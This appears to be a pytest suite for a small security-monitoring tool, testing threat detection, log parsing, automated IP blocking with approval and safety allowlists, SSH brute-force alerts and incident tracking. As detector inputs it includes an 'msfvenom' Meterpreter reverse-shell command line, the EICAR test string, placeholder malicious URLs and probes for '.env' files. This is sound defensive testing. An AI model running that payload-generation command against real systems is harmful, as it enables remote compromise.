"""
핵심 탐지 로직 단위 테스트
실행: ./venv/bin/pytest tests/ -v
"""
import os
import sys
import json

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.threat_detector import ThreatDetector, Alert
from modules.sysmon_parser import detect_metasploit
from modules.threat_intel import _parse_ip_list, _parse_url_list
from modules.hash_checker import HashChecker
from modules.alert_store import AlertStore
from modules.access_log_parser import AccessLogCollector, classify_request
from modules.soar import SOAREngine
from modules.decision_support import DecisionSupport
from modules.incidents import IncidentManager
from modules.auth import AuthManager
from modules.authlog_parser import AuthLogMonitor
from modules.virustotal import VirusTotalClient


class FakeSocketIO:
    def __init__(self):
        self.emitted = []

    def emit(self, event, data=None, **kwargs):
        self.emitted.append((event, data))


def make_detector():
    return ThreatDetector(FakeSocketIO(), config={}, store_path=None)


# ─────────────────── ThreatDetector ───────────────────

def test_port_scan_detection():
    td = make_detector()
    src = "8.8.8.8"  # 외부 IP (신뢰 목록 제외)
    for port in range(1, 45):
        td.analyze_packet(src, "192.168.1.10", port, "TCP", 60)
    alerts = td.get_alerts()
    assert any(a["threat_type"] == "PORT_SCAN" for a in alerts)


def test_trusted_ip_not_alerted():
    td = make_detector()
    for port in range(1, 60):
        td.analyze_packet("127.0.0.1", "192.168.1.10", port, "TCP", 60)
    assert td.get_alerts() == []


def test_ack_updates_acknowledged_stat():
    td = make_detector()
    alert = Alert("PORT_SCAN", "HIGH", "1.2.3.4", "5.6.7.8", "테스트")
    td._add_alert(alert)
    assert td.get_stats()["open"] == 1

    assert td.update_alert_status(alert.id, "ACK", note="확인함", assignee="분석가")
    stats = td.get_stats()
    assert stats["acknowledged"] == 1
    assert stats["open"] == 0

    updated = next(a for a in td.get_alerts() if a["id"] == alert.id)
    assert updated["status"] == "ACK"
    assert updated["note"] == "확인함"
    assert updated["assignee"] == "분석가"


def test_update_unknown_alert_returns_false():
    td = make_detector()
    assert td.update_alert_status(99999, "CLOSED") is False


def test_is_external():
    td = make_detector()
    assert td._is_external("8.8.8.8")
    assert not td._is_external("192.168.0.5")
    assert not td._is_external("10.1.2.3")
    assert not td._is_external("172.20.0.1")
    assert not td._is_external("127.0.0.1")


def test_low_confidence_alert_suppressed():
    td = make_detector()
    # 내부→내부 MEDIUM: 신뢰도 0.35 → 임계값(0.5) 미만 → emit 억제
    td._add_alert(Alert("ARP_SPOOFING", "MEDIUM", "192.168.1.20", "192.168.1.1", "오탐 후보"))
    assert td.get_stats()["suppressed"] == 1
    assert not any(ev == "new_alert" for ev, _ in td.socketio.emitted)
    # 저장은 되어 있고 오탐 의심 플래그가 붙음
    stored = td.get_alerts()[0]
    assert stored["details"]["low_confidence"] is True


def test_high_confidence_alert_emitted():
    td = make_detector()
    # 외부 출발지 CRITICAL: 신뢰도 0.85 → 정상 emit
    td._add_alert(Alert("DDOS", "CRITICAL", "203.0.113.7", "192.168.1.10", "정탐"))
    assert td.get_stats()["suppressed"] == 0
    assert any(ev == "new_alert" for ev, _ in td.socketio.emitted)
    assert td.get_alerts()[0]["confidence"] >= 0.75


# ─────────────────── Metasploit 시그니처 ───────────────────

def test_detect_metasploit_cmdline():
    hit, reason, tech = detect_metasploit({
        "event_id": 1,
        "message": "CommandLine: msfvenom -p windows/meterpreter/reverse_tcp",
        "process": "cmd.exe",
    })
    assert hit
    assert tech is not None


def test_detect_metasploit_default_port():
    hit, reason, tech = detect_metasploit({
        "event_id": 3,
        "message": "network connection destinationport: 4444",
        "process": "svchost.exe",
    })
    assert hit
    assert tech == "T1571"


def test_detect_metasploit_clean_event():
    hit, _, _ = detect_metasploit({
        "event_id": 1,
        "message": "CommandLine: notepad.exe report.txt",
        "process": "notepad.exe",
    })
    assert not hit


# ─────────────────── ThreatIntel 파서 ───────────────────

def test_parse_ip_list():
    text = """# 주석
1.2.3.4
5.6.7.0/24 ; SBL123
잘못된줄
999.1.1.1
"""
    ips = _parse_ip_list(text)
    assert "1.2.3.4" in ips
    assert "5.6.7.0" in ips
    assert len(ips) == 2


def test_parse_url_list():
    text = "# c\nhttp://evil.example/gate.php\nftp://skip.me\nhttps://bad.example/x"
    urls = _parse_url_list(text)
    assert urls == {"http://evil.example/gate.php", "https://bad.example/x"}


# ─────────────────── HashChecker ───────────────────

def test_eicar_hash_detected():
    hc = HashChecker()
    r = hc.check_hash("44d88612fea8a8f36de82e1278abb02f", "md5")
    assert r["malicious"]
    assert "EICAR" in r["description"]


def test_clean_hash_not_detected():
    hc = HashChecker()
    r = hc.check_hash("a" * 64, "sha256")
    assert not r["malicious"]


def test_scan_file_eicar(tmp_path):
    eicar = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    f = tmp_path / "eicar.txt"
    f.write_bytes(eicar.encode())
    hc = HashChecker()
    result = hc.scan_file(str(f))
    assert result["malicious"]
    assert len(hc.get_scan_history()) == 1


# ─────────────────── SIEM 접근 로그 파서 ───────────────────

def test_siem_parse_access_line():
    c = AccessLogCollector(FakeSocketIO(), sources=[])
    e = c._parse_line('1.2.3.4 - - [02/Jun/2026 09:04:27] "GET /api HTTP/1.1" 200 -', "테스트")
    assert e["ip"] == "1.2.3.4"
    assert e["status"] == 200
    assert not e["suspicious"]


def test_siem_skips_code_lines_and_noise():
    c = AccessLogCollector(FakeSocketIO(), sources=[])
    assert c._parse_line(
        "1.2.3.4 - - [02/Jun/2026 09:04:14] code 400, message Bad request", "t") is None
    assert c._parse_line("2026-06-06 19:04:14 | INFO | app log line", "t") is None


def test_siem_classify_probes():
    assert classify_request("\\x16\\x03\\x01\\x00", 400) == (True, "HIGH", "TLS 프로브 (HTTPS 스캔)")
    assert classify_request("PRI * HTTP/2.0", 505)[0] is True
    assert classify_request("GET /.env HTTP/1.1", 404)[1] == "CRITICAL"
    assert classify_request("GET / HTTP/1.1", 200)[0] is False


def test_siem_reads_file(tmp_path):
    log = tmp_path / "access.log"
    log.write_text(
        '8.8.8.8 - - [14/Jul/2026 10:00:00] "GET / HTTP/1.1" 200 -\n'
        '9.9.9.9 - - [14/Jul/2026 10:00:01] "GET /wp-login.php HTTP/1.1" 404 -\n'
        "앱 로그 잡음 라인\n")
    c = AccessLogCollector(FakeSocketIO(),
                           sources=[{"name": "T", "path": str(log)}],
                           state_path=str(tmp_path / "state.json"))
    # emit 불리언 → mode("backfill"/"live") 로 대체됨 (첫 적재 유실 수정)
    c._read_source(c.sources[0], mode="backfill")
    stats = c.get_stats()
    assert stats["total_events"] == 2
    assert stats["suspicious_events"] == 1
    # 증분 읽기: 같은 파일 재읽기 시 새 이벤트 없어야 함
    c._read_source(c.sources[0], mode="live")
    assert c.get_stats()["total_events"] == 2


# ─────────────────── SOAR 자동 대응 ───────────────────

class FakeAI:
    def __init__(self, is_tp, confidence=90):
        self.is_tp = is_tp
        self.confidence = confidence

    def analyze_alert(self, alert, async_mode=True):
        return {"result": {"is_true_positive": self.is_tp,
                           "confidence": self.confidence,
                           "summary": "테스트 판정"}}


def make_soar(tmp_path, is_tp=True, confidence=90, td=None):
    return SOAREngine(FakeSocketIO(), config={"SOAR_BLOCK_MODE": "simulate",
                                              "SOAR_AUTO_BLOCK": "True"},
                      ai_analyst=FakeAI(is_tp, confidence),
                      threat_detector=td,
                      blocklist_path=str(tmp_path / "blocklist.txt"))


def test_soar_fp_auto_close(tmp_path):
    td = make_detector()
    alert = Alert("PORT_SCAN", "HIGH", "8.8.8.8", "192.168.1.5", "스캔")
    td._add_alert(alert)
    soar = make_soar(tmp_path, is_tp=False, td=td)
    soar._process_alert(alert.to_dict())

    assert soar.stats["auto_closed_fp"] == 1
    closed = next(a for a in td.get_alerts() if a["id"] == alert.id)
    assert closed["status"] == "CLOSED"
    assert "오탐" in closed["note"]


def test_soar_tp_critical_auto_block(tmp_path):
    td = make_detector()
    alert = Alert("DDOS", "CRITICAL", "45.155.205.233", "192.168.1.5", "DDoS")
    td._add_alert(alert)
    soar = make_soar(tmp_path, is_tp=True, confidence=95, td=td)
    soar._process_alert(alert.to_dict())

    assert soar.stats["escalated_tp"] == 1
    assert "45.155.205.233" in soar.blocked_ips
    acked = next(a for a in td.get_alerts() if a["id"] == alert.id)
    assert acked["status"] == "ACK"


def test_soar_no_block_for_internal_ip(tmp_path):
    td = make_detector()
    alert = Alert("MALWARE_BEACON", "CRITICAL", "192.168.1.30", "45.33.1.2", "비콘")
    td._add_alert(alert)
    soar = make_soar(tmp_path, is_tp=True, confidence=95, td=td)
    soar._process_alert(alert.to_dict())
    # 내부 IP는 차단하지 않음 (자기 자신 차단 방지)
    assert "192.168.1.30" not in soar.blocked_ips


def test_soar_siem_scanner_blocks_after_3_probes(tmp_path):
    soar = make_soar(tmp_path)
    ev = {"ip": "66.132.1.1", "severity": "HIGH",
          "category": "TLS 프로브", "source": "자동매매 KR"}
    for _ in range(3):
        soar._process_siem(dict(ev))
    assert "66.132.1.1" in soar.blocked_ips
    assert soar.stats["auto_blocked"] == 1   # 중복 차단 없음


def test_soar_ioc_block_and_persistence(tmp_path):
    soar = make_soar(tmp_path)
    soar._process_ti({"kind": "ip", "indicator": "45.155.205.233",
                      "description": "C2 통신"})
    assert "45.155.205.233" in soar.blocked_ips

    # 재기동 시 차단 목록 복원
    soar2 = make_soar(tmp_path)
    assert "45.155.205.233" in soar2.blocked_ips
    assert soar2.manual_unblock("45.155.205.233")
    assert "45.155.205.233" not in soar2.blocked_ips


def test_soar_playbook_toggle(tmp_path):
    soar = make_soar(tmp_path)
    assert soar.toggle_playbook("PB-IOC-BLOCK") is False
    soar._process_ti({"kind": "ip", "indicator": "1.2.3.4", "description": "x"})
    assert "1.2.3.4" not in soar.blocked_ips


def test_virustotal_hash_lookup_parses_stats(monkeypatch):
    class Response:
        status_code = 200
        def raise_for_status(self): pass
        def json(self):
            return {"data": {"attributes": {"sha256": "a" * 64,
                "meaningful_name": "sample.exe", "type_description": "Win32 EXE",
                "last_analysis_stats": {"malicious": 12, "suspicious": 2,
                                        "harmless": 4, "undetected": 50}}}}
    monkeypatch.setattr("modules.virustotal.requests.get", lambda *a, **k: Response())
    vt = VirusTotalClient({"VIRUSTOTAL_API_KEY": "test"})
    result = vt.lookup_hash("a" * 64)
    assert result["ok"] and result["verdict"] == "MALICIOUS"
    assert result["malicious"] == 12


def test_soar_malware_playbook_tracks_steps(tmp_path):
    soar = make_soar(tmp_path)
    soar.virustotal = VirusTotalClient({})
    soar._process_malware_enrichment({"id": 7, "threat_type": "EDR_THREAT",
                                      "details": {"sha256": "a" * 64}})
    run = soar.get_status()["executions"][0]
    assert run["playbook"] == "PB-MALWARE-ENRICH"
    assert run["status"] == "completed"
    states = {s["key"]: s["status"] for s in run["steps"]}
    assert states["hash"] == "completed"
    assert states["vt"] == "skipped"
    assert states["handoff"] == "completed"


def test_soar_execution_history_survives_restart(tmp_path):
    soar = make_soar(tmp_path)
    soar.virustotal = VirusTotalClient({})
    result = soar.test_virustotal("a" * 64)
    assert result["status"] == "not_configured"

    restored = make_soar(tmp_path).get_status()["executions"]
    assert restored[0]["id"] == result["execution_id"]
    assert restored[0]["playbook"] == "PB-MALWARE-ENRICH"
    assert restored[0]["status"] == "completed"


def test_soar_failed_vt_execution_can_retry(tmp_path):
    class FlakyVirusTotal:
        calls = 0

        def lookup_hash(self, value):
            self.calls += 1
            if self.calls == 1:
                return {"ok": False, "status": "timeout", "hash": value}
            return {"ok": True, "status": "found", "hash": value,
                    "verdict": "MALICIOUS", "malicious": 3, "suspicious": 0}

        def status(self):
            return {"active": True}

    soar = make_soar(tmp_path)
    soar.virustotal = FlakyVirusTotal()
    first = soar.test_virustotal("b" * 64)
    first_run = soar.get_status()["executions"][0]
    assert not first["ok"] and first_run["status"] == "failed"
    assert next(s for s in first_run["steps"] if s["key"] == "vt")["status"] == "failed"

    retried = soar.retry_execution(first["execution_id"])
    assert retried["ok"]
    run = soar.get_status()["executions"][0]
    assert run["status"] == "completed"
    assert run["retry_of"] == first["execution_id"]
    assert run["attempt"] == 2


def test_soar_retry_rejects_completed_execution(tmp_path):
    soar = make_soar(tmp_path)
    soar.virustotal = VirusTotalClient({})
    result = soar.test_virustotal("c" * 64)
    assert soar.retry_execution(result["execution_id"])["status"] == "not_failed"


def make_approval_soar(tmp_path, timeout=15):
    return SOAREngine(FakeSocketIO(), config={"SOAR_BLOCK_MODE": "simulate",
                      "SOAR_AUTO_BLOCK": "True", "SOAR_APPROVAL_REQUIRED": True,
                      "SOAR_APPROVAL_TIMEOUT_MINUTES": timeout},
                      blocklist_path=str(tmp_path / "approval-blocklist.txt"))


def test_soar_block_waits_for_analyst_approval(tmp_path):
    soar = make_approval_soar(tmp_path)
    result = soar.manual_block_request("8.8.4.4", "승인 테스트")
    assert result["status"] == "waiting_approval"
    assert "8.8.4.4" not in soar.blocked_ips
    run = soar.get_status()["executions"][0]
    assert run["status"] == "waiting_approval"
    assert run["approval"]["requested_by"] == "MANUAL"

    reviewed = soar.review_approval(run["id"], "approve", "analyst", "확인 완료")
    assert reviewed["ok"] and "8.8.4.4" in soar.blocked_ips
    completed = soar.get_status()["executions"][0]
    assert completed["status"] == "completed"
    assert completed["approval"]["actor"] == "analyst"


def test_soar_block_rejection_never_executes(tmp_path):
    soar = make_approval_soar(tmp_path)
    result = soar.manual_block_request("9.9.9.9", "거절 테스트")
    reviewed = soar.review_approval(result["execution_id"], "reject", "analyst", "근거 부족")
    assert reviewed["status"] == "rejected"
    assert "9.9.9.9" not in soar.blocked_ips
    assert soar.review_approval(result["execution_id"], "approve", "analyst")["status"] == "not_pending"


def test_soar_pending_approval_survives_restart(tmp_path):
    first = make_approval_soar(tmp_path)
    result = first.manual_block_request("7.7.7.7", "복원 테스트")
    restored = make_approval_soar(tmp_path)
    run = restored.get_status()["executions"][0]
    assert run["id"] == result["execution_id"]
    assert run["status"] == "waiting_approval"
    assert restored.review_approval(run["id"], "cancel", "analyst")["status"] == "cancelled"


def test_soar_batch_approval_only_processes_requested_snapshot(tmp_path):
    soar = make_approval_soar(tmp_path)
    first = soar.manual_block_request("6.6.6.6", "일괄 1")
    second = soar.manual_block_request("5.5.5.5", "일괄 2")
    untouched = soar.manual_block_request("4.4.4.4", "일괄 제외")
    result = soar.approve_many([first["execution_id"], second["execution_id"]],
                               "analyst", "확인 완료")
    assert result["approved"] == 2 and result["failed"] == 0
    assert {"6.6.6.6", "5.5.5.5"}.issubset(soar.blocked_ips)
    assert "4.4.4.4" not in soar.blocked_ips
    pending = [e["id"] for e in soar.get_status()["executions"]
               if e["status"] == "waiting_approval"]
    assert pending == [untouched["execution_id"]]


def test_virustotal_enrichment_persists_on_alert(tmp_path):
    td = ThreatDetector(FakeSocketIO(), config={}, store_path=str(tmp_path / "alerts.db"))
    alert = Alert("EDR_THREAT", "HIGH", "host", "server", "malware",
                  details={"sha256": "a" * 64})
    td._add_alert(alert)
    assert td.enrich_alert(alert.id, {"virustotal": {"verdict": "MALICIOUS", "malicious": 9}})
    rows, total = td.search_alerts(limit=10)
    assert total == 1
    assert rows[0]["details"]["virustotal"]["malicious"] == 9


def test_soar_block_ttl_expiry(tmp_path):
    soar = make_soar(tmp_path)
    soar.block_ttl_hours = 0.0001   # 0.36초
    soar._block_ip("6.6.6.6", "TTL 테스트", playbook="MANUAL")
    assert "6.6.6.6" in soar.blocked_ips

    import time as _t
    _t.sleep(0.5)
    soar._expire_blocks()
    assert "6.6.6.6" not in soar.blocked_ips
    assert any(a["action"] == "unblock" and a["target"] == "6.6.6.6"
               for a in soar.actions)


def test_soar_safety_never_blocks_tailscale(tmp_path):
    soar = make_soar(tmp_path)
    # Tailscale/CGNAT (100.64.0.0/10) 절대 차단 금지
    assert soar._block_ip("100.64.140.27", "실수", playbook="MANUAL") is False
    assert "100.64.140.27" not in soar.blocked_ips
    assert soar.stats["blocks_prevented"] == 1
    # 경계값: 100.64.0.0 ~ 100.127.255.255
    assert soar._is_cgnat("100.64.0.1")
    assert soar._is_cgnat("100.127.255.254")
    assert not soar._is_cgnat("100.63.0.1")
    assert not soar._is_cgnat("100.128.0.1")


def test_soar_safety_never_blocks_private_or_self(tmp_path):
    soar = make_soar(tmp_path)
    for ip in ("192.168.1.10", "10.0.0.5", "172.20.1.1", "127.0.0.1"):
        assert soar._block_ip(ip, "실수", playbook="MANUAL") is False
        assert ip not in soar.blocked_ips
    # 서버 자신 IP도 차단 금지
    if soar._own_ips:
        own = next(iter(soar._own_ips))
        assert soar._block_ip(own, "실수", playbook="MANUAL") is False


def test_soar_allowlist_protects_ip_and_prefix(tmp_path):
    soar = SOAREngine(FakeSocketIO(),
                      config={"SOAR_BLOCK_MODE": "simulate",
                              "SOAR_BLOCK_ALLOWLIST": "203.0.113.5, 198.51.100."},
                      blocklist_path=str(tmp_path / "bl.txt"))
    assert soar._block_ip("203.0.113.5", "x", playbook="MANUAL") is False   # 정확 일치
    assert soar._block_ip("198.51.100.77", "x", playbook="MANUAL") is False  # 접두 대역
    # 화이트리스트 밖 외부 IP는 정상 차단
    assert soar._block_ip("45.155.205.233", "악성", playbook="MANUAL") is True
    assert "45.155.205.233" in soar.blocked_ips


def test_soar_manual_block_respects_safety(tmp_path):
    soar = make_soar(tmp_path)
    # 수동 차단도 안전장치 적용 (실수로 Tailscale 차단 방지)
    assert soar.manual_block("100.64.1.1", "실수 클릭") is False
    assert "100.64.1.1" not in soar.blocked_ips


def test_soar_block_ttl_zero_is_permanent(tmp_path):
    soar = make_soar(tmp_path)
    soar.block_ttl_hours = 0
    soar._block_ip("7.7.7.7", "영구 차단", playbook="MANUAL")
    soar._expire_blocks()
    assert "7.7.7.7" in soar.blocked_ips
    assert soar.blocked_ips["7.7.7.7"]["expires"] == "영구"


# ─────────────────── SSH 인증 로그 탐지 ───────────────────

class FakeDetector:
    def __init__(self):
        self.alerts = []

    def report_alert(self, threat_type, severity, src_ip, dst_ip, description, details=None):
        self.alerts.append({"threat_type": threat_type, "severity": severity,
                            "src_ip": src_ip, "description": description,
                            "details": details or {}})

    def get_stats(self):
        return {"total_alerts": len(self.alerts)}


def test_authlog_parse_failed_and_accepted():
    td = FakeDetector()
    m = AuthLogMonitor(FakeSocketIO(), config={}, threat_detector=td)
    m._process_line("Jul 15 10:00:00 host sshd[1]: Failed password for root from 45.1.2.3 port 51 ssh2")
    m._process_line("Jul 15 10:00:01 host sshd[2]: Invalid user oracle from 45.1.2.3")
    m._process_line("Jul 15 10:00:02 host sshd[3]: Accepted publickey for me from 100.66.201.56 port 51585 ssh2")
    evs = m.get_events()
    types = [e["type"] for e in evs]
    assert "failed" in types and "invalid" in types and "accepted" in types
    assert m.stats["accepted"] == 1


def test_authlog_bruteforce_fires_alert():
    td = FakeDetector()
    m = AuthLogMonitor(FakeSocketIO(), config={"SSH_BRUTE_THRESHOLD": 5,
                                               "SSH_BRUTE_WINDOW": 120},
                       threat_detector=td)
    for _ in range(5):
        m._process_line("Jul 15 10:00:00 host sshd[1]: Failed password for root from 203.0.113.77 port 22 ssh2")
    assert len(td.alerts) == 1
    a = td.alerts[0]
    assert a["threat_type"] == "BRUTE_FORCE"
    assert a["src_ip"] == "203.0.113.77"
    assert a["details"]["fail_count"] >= 5


def test_authlog_internal_ip_no_bruteforce():
    td = FakeDetector()
    m = AuthLogMonitor(FakeSocketIO(), config={"SSH_BRUTE_THRESHOLD": 3},
                       threat_detector=td)
    # Tailscale/사설 IP는 브루트포스 집계 제외 (자기 자신 오탐 방지)
    for _ in range(6):
        m._process_line("Jul 15 10:00:00 host sshd[1]: Failed password for me from 100.66.201.56 port 22 ssh2")
        m._process_line("Jul 15 10:00:00 host sshd[1]: Failed password for me from 192.168.0.5 port 22 ssh2")
    assert td.alerts == []


def test_authlog_bruteforce_cooldown():
    td = FakeDetector()
    m = AuthLogMonitor(FakeSocketIO(), config={"SSH_BRUTE_THRESHOLD": 3},
                       threat_detector=td)
    for _ in range(10):   # 임계 넘어도 쿨다운 내 1회만
        m._process_line("Jul 15 10:00:00 host sshd[1]: Failed password for root from 8.8.4.4 port 22 ssh2")
    assert len(td.alerts) == 1


# ─────────────────── 인증 ───────────────────

def test_auth_verify_correct_and_wrong():
    a = AuthManager("admin", password="s3cret")
    assert a.configured
    ok, reason = a.verify("admin", "s3cret", "1.1.1.1")
    assert ok and reason == "ok"
    ok, reason = a.verify("admin", "wrong", "1.1.1.1")
    assert not ok and reason == "bad"
    ok, reason = a.verify("hacker", "s3cret", "1.1.1.1")
    assert not ok


def test_auth_password_never_plaintext():
    a = AuthManager("admin", password="s3cret")
    assert "s3cret" not in a.password_hash   # 해시 저장


def test_auth_no_password_means_locked_out():
    a = AuthManager("admin")   # 비밀번호 미설정
    assert not a.configured
    ok, reason = a.verify("admin", "anything")
    assert not ok and reason == "no_password"


def test_auth_bruteforce_lockout():
    a = AuthManager("admin", password="pw", max_attempts=3, window=300, lockout=60)
    ip = "9.9.9.9"
    for _ in range(2):
        assert a.verify("admin", "bad", ip)[1] == "bad"
    # 3번째 실패에서 잠금
    assert a.verify("admin", "bad", ip)[1] == "locked"
    assert a.is_locked(ip)
    # 잠긴 동안엔 올바른 비번도 거부
    assert a.verify("admin", "pw", ip)[1] == "locked"
    # 다른 IP는 영향 없음
    assert a.verify("admin", "pw", "8.8.8.8")[0] is True


# ─────────────────── 인시던트 케이스 관리 ───────────────────

def _fake_alert(aid, threat="DDOS", src="203.0.113.9", sev="CRITICAL"):
    return {"id": aid, "threat_type": threat, "threat_label": threat,
            "src_ip": src, "severity": sev}


def test_incident_promote_and_merge(tmp_path):
    im = IncidentManager(store_path=str(tmp_path / "inc.json"))
    id1 = im.promote_alert(_fake_alert(1), "AI 정탐")
    id2 = im.promote_alert(_fake_alert(2, src="203.0.113.55"), "AI 정탐")  # 같은 /24 → 병합
    assert id1 == id2
    inc = im.get(id1)
    assert len(inc["alert_ids"]) == 2

    # 다른 위협유형은 새 케이스
    id3 = im.promote_alert(_fake_alert(3, threat="PORT_SCAN"), "AI 정탐")
    assert id3 != id1
    assert im.get_stats()["total"] == 2


def test_incident_timeline_includes_virustotal(tmp_path):
    im = IncidentManager(store_path=str(tmp_path / "inc.json"))
    alert = _fake_alert(1, threat="EDR_THREAT")
    alert["details"] = {"virustotal": {"verdict": "MALICIOUS", "malicious": 42,
                                         "suspicious": 1, "sha256": "a" * 64}}
    inc_id = im.promote_alert(alert)
    timeline = im.get(inc_id)["timeline"]
    assert any(t["kind"] == "enrich" and "악성 42" in t["text"] for t in timeline)


def test_incident_block_and_lifecycle(tmp_path):
    im = IncidentManager(store_path=str(tmp_path / "inc.json"))
    inc_id = im.promote_alert(_fake_alert(1))
    assert im.attach_block("203.0.113.9", "자동 차단")
    inc = im.get(inc_id)
    assert inc["status"] == "INVESTIGATING"   # 차단 조치 시 자동 전환

    assert im.update(inc_id, status="RESOLVED", assignee="분석가", note="처리 완료")
    inc = im.get(inc_id)
    assert inc["status"] == "RESOLVED"
    assert inc["assignee"] == "분석가"
    assert any(t["kind"] == "note" for t in inc["timeline"])
    # RESOLVED 후 같은 그룹 정탐 → 새 케이스 생성
    new_id = im.promote_alert(_fake_alert(9))
    assert new_id != inc_id


def test_incident_persistence(tmp_path):
    path = str(tmp_path / "inc.json")
    im1 = IncidentManager(store_path=path)
    inc_id = im1.promote_alert(_fake_alert(1))
    im2 = IncidentManager(store_path=path)
    assert im2.get(inc_id) is not None
    assert im2.get_stats()["total"] == 1


def test_incident_recovers_from_backup(tmp_path):
    path = str(tmp_path / "inc.json")
    im = IncidentManager(store_path=path)
    inc_id = im.promote_alert(_fake_alert(1))
    im.update(inc_id, note="백업 생성")
    with open(path, "w", encoding="utf-8") as f:
        f.write('{"incidents":')

    recovered = IncidentManager(store_path=path)
    assert recovered.get(inc_id) is not None
    with open(path, "r", encoding="utf-8") as f:
        assert json.load(f)["incidents"]


def test_alert_store_groups_repeated_alerts(tmp_path):
    store = AlertStore(str(tmp_path / "alerts.db"))
    for _ in range(3):
        store.save(Alert("PORT_SCAN", "HIGH", "8.8.8.8", "10.0.0.1", "scan"))
    store.save(Alert("DDOS", "CRITICAL", "1.1.1.1", "10.0.0.1", "ddos"))
    groups = store.grouped_recent(hours=24, min_count=2)
    assert len(groups) == 1
    assert groups[0]["src_ip"] == "8.8.8.8"
    assert groups[0]["count"] == 3
    assert groups[0]["severity"] == "HIGH"


def test_soar_promotes_incident_on_tp(tmp_path):
    td = make_detector()
    alert = Alert("DDOS", "CRITICAL", "45.155.205.233", "192.168.1.5", "DDoS")
    td._add_alert(alert)
    soar = make_soar(tmp_path, is_tp=True, confidence=95, td=td)
    soar.incidents = IncidentManager(store_path=str(tmp_path / "inc.json"))
    soar._process_alert(alert.to_dict())

    stats = soar.incidents.get_stats()
    assert stats["total"] == 1
    # 차단이 타임라인에 기록되어 INVESTIGATING 전환
    inc = soar.incidents.get_all()[0]
    assert inc["status"] == "INVESTIGATING"


# ─────────────────── ML 의사결정 지원 ───────────────────

def _obs(ds, alert_id, threat_type="PORT_SCAN", src_ip="8.8.8.1", sev="HIGH"):
    ds.observe_alert({"id": alert_id, "threat_type": threat_type,
                      "src_ip": src_ip, "severity": sev})


def test_decision_clustering_and_verdicts():
    ds = DecisionSupport()
    for i in range(5):
        _obs(ds, i, src_ip=f"8.8.8.{i+1}")           # 같은 /24 → 한 그룹
    _obs(ds, 99, threat_type="DDOS", src_ip="1.1.1.1")

    assert ds.get_summary()["cluster_count"] == 2
    cluster = next(c for c in ds.get_clusters() if c["threat_type"] == "PORT_SCAN")
    assert cluster["count"] == 5
    assert cluster["unique_ips"] == 5

    # 판정 학습: 오탐 4건
    for i in range(4):
        assert ds.record_verdict(i, is_tp=False, source="AI")
    cluster = next(c for c in ds.get_clusters() if c["threat_type"] == "PORT_SCAN")
    assert cluster["fp"] == 4
    assert cluster["recommendation"] == "FP_TUNE"


def test_decision_prior_lowers_detector_confidence():
    ds = DecisionSupport()
    td = make_detector()
    td.decision = ds

    # 같은 그룹에서 오탐 판정 5건 누적
    for i in range(5):
        _obs(ds, 1000 + i, threat_type="PORT_SCAN", src_ip="9.9.9.9")
        ds.record_verdict(1000 + i, is_tp=False)
    prior = ds.cluster_prior("PORT_SCAN", "9.9.9.9")
    assert prior and prior[0] < 0.2

    # prior 없는 그룹 대비 신뢰도가 낮아야 함
    a_known_fp = Alert("PORT_SCAN", "HIGH", "9.9.9.9", "192.168.1.5", "x")
    a_fresh    = Alert("PORT_SCAN", "HIGH", "77.77.77.77", "192.168.1.5", "x")
    assert td._confidence(a_known_fp) < td._confidence(a_fresh)


def test_decision_block_recommendation():
    ds = DecisionSupport()
    for i in range(4):
        _obs(ds, i, threat_type="DDOS", src_ip="203.0.113.5", sev="CRITICAL")
        ds.record_verdict(i, is_tp=True)
    cluster = ds.get_clusters()[0]
    assert cluster["recommendation"] == "BLOCK"


# ─────────────────── AlertStore 영속화 ───────────────────

def test_alert_store_roundtrip(tmp_path):
    db = str(tmp_path / "alerts.db")
    store = AlertStore(db)
    alert = Alert("DDOS", "CRITICAL", "1.1.1.1", "2.2.2.2", "테스트 경보",
                  {"pps": 3000})
    store.save(alert)
    store.update_status(alert.id, "ACK", note="메모", assignee="김분석")

    rows = store.load_recent()
    assert len(rows) == 1
    row = rows[0]
    assert row["id"] == alert.id
    assert row["threat_type"] == "DDOS"
    assert row["details"] == {"pps": 3000}
    assert row["status"] == "ACK"
    assert row["note"] == "메모"
    assert row["assignee"] == "김분석"
    assert store.max_id() == alert.id
    store.close()


def test_alert_store_search_filters(tmp_path):
    db = str(tmp_path / "alerts.db")
    store = AlertStore(db)
    a1 = Alert("DDOS", "CRITICAL", "185.220.101.45", "10.0.0.1", "C2 통신")
    a1.timestamp = "2026-07-10 08:00:00"
    a2 = Alert("PORT_SCAN", "HIGH", "203.0.113.9", "10.0.0.1", "포트 스캔 탐지")
    a2.timestamp = "2026-07-15 09:00:00"
    a3 = Alert("DDOS", "CRITICAL", "1.2.3.4", "10.0.0.1", "대량 트래픽")
    a3.timestamp = "2026-07-20 10:00:00"
    for a in (a1, a2, a3):
        store.save(a)

    # 심각도
    rows, total = store.search(severity="CRITICAL")
    assert total == 2 and all(r["severity"] == "CRITICAL" for r in rows)
    # 유형
    _, total = store.search(threat_type="PORT_SCAN")
    assert total == 1
    # IP 부분일치(src/dst)
    _, total = store.search(ip="185.220")
    assert total == 1
    # 본문 검색
    _, total = store.search(text="스캔")
    assert total == 1
    # 기간(포함 경계)
    _, total = store.search(date_from="2026-07-12", date_to="2026-07-16")
    assert total == 1
    # 페이지네이션: 최신 우선(id DESC)
    rows, total = store.search(limit=2, offset=0)
    assert total == 3 and len(rows) == 2
    assert rows[0]["id"] > rows[1]["id"]
    # 조건 없으면 전체
    _, total = store.search()
    assert total == 3
    store.close()


def test_detector_search_alerts_adds_label(tmp_path):
    db = str(tmp_path / "alerts.db")
    td = ThreatDetector(FakeSocketIO(), config={}, store_path=db)
    td._add_alert(Alert("BRUTE_FORCE", "HIGH", "5.5.5.5", "6.6.6.6", "무차별 대입"))
    rows, total = td.search_alerts(severity="HIGH")
    assert total == 1
    assert rows[0]["threat_label"] == "무차별 대입 공격"
    td.store.close()


def test_detector_restores_from_store(tmp_path):
    db = str(tmp_path / "alerts.db")
    td1 = ThreatDetector(FakeSocketIO(), config={}, store_path=db)
    td1._add_alert(Alert("PORT_SCAN", "HIGH", "3.3.3.3", "4.4.4.4", "복원 테스트"))
    saved_id = td1.get_alerts()[0]["id"]
    td1.store.close()

    td2 = ThreatDetector(FakeSocketIO(), config={}, store_path=db)
    restored = td2.get_alerts()
    assert any(a["id"] == saved_id and a["description"] == "복원 테스트"
               for a in restored)
    assert td2.get_stats()["total_alerts"] >= 1
    td2.store.close()


